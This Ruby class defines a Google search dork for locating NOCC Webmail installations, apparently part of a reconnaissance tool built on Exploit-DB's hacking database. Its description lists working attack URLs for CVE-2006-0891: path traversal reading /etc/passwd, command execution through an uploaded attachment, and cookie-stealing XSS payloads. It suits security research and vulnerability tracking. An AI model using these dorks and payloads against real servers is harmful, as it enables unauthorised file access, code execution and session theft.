module Dorks
   class Dork3603 < Vulpes::Dork

      def initialize
         super({
            name: "Dork 3603",
            ghdb_url: "https://www.exploit-db.com/ghdb/3603",
            severity: "6",
            category: "advisories_and_vulnerabilities.cve-2006-0891",
            publish_date: "2010-11-15",
            author: "anonymous",
            dork: <<~EDORK,
("powered by nocc" intitle:"NOCC Webmail") -site:sourceforge.net -Zoekinalles.nl -analysis
EDORK
            description: <<~EDESC
NOCC Webmail 1.0 (Local Inclusion) Remote Code Execution Exploit - CVE: 2006-0891: https://www.exploit-db.com/exploits/1522/
software: http://nocc.sourceforge.net/ this is for Nocc Webmail multiple arbitrary local inclusion, multiple xss & possible remote code execution flaws I found: example of arbitrary local inclusion: http://[target]/[path]/html/footer.php?cmd=dir&_SESSION[nocc_theme]=../../../../../../../../../test.php%00 http://[target]/[path]/html/footer.php?_SESSION[nocc_theme]=../../../../../../../../../../../../etc/passwd%00 http://[target]/[path]/index.php?lang=fr&theme=../../../../../../../../../../../../etc/passwd%00 http://[target]/[path]/index.php?lang=../../../../../../../../../../../../test example of commands execution (including an uploaded mail attachment with php code inside, filename is predictable...) http://[target]/[path]/index.php?cmd=dir&lang=../tmp/php331.tmp1140514888.att%00 xss: http://[target]/[path]/html/error.php?html_error_occurred=alert(document.cookie) http://[target]/[path]/html/filter_prefs.php?html_filter_select=alert(document.cookie) http://[target]/[path]/html/no_mail.php?html_no_mail=alert(document.cookie) http://[target]/[path]/html/html_bottom_table.php?page_line=alert(document.cookie) http://[target]/[path]/html/html_bottom_table.php?prev=alert(document.cookie) http://[target]/[path]/html/html_bottom_table.php?next=alert(document.cookie) http://[target]/[path]/html/footer.php?_SESSION[nocc_theme]=">alert(document.cookie) full advisory & poc exploit: http://retrogod.altervista.org/noccw_10_incl_xpl.html
EDESC
         })

      end
   end
end
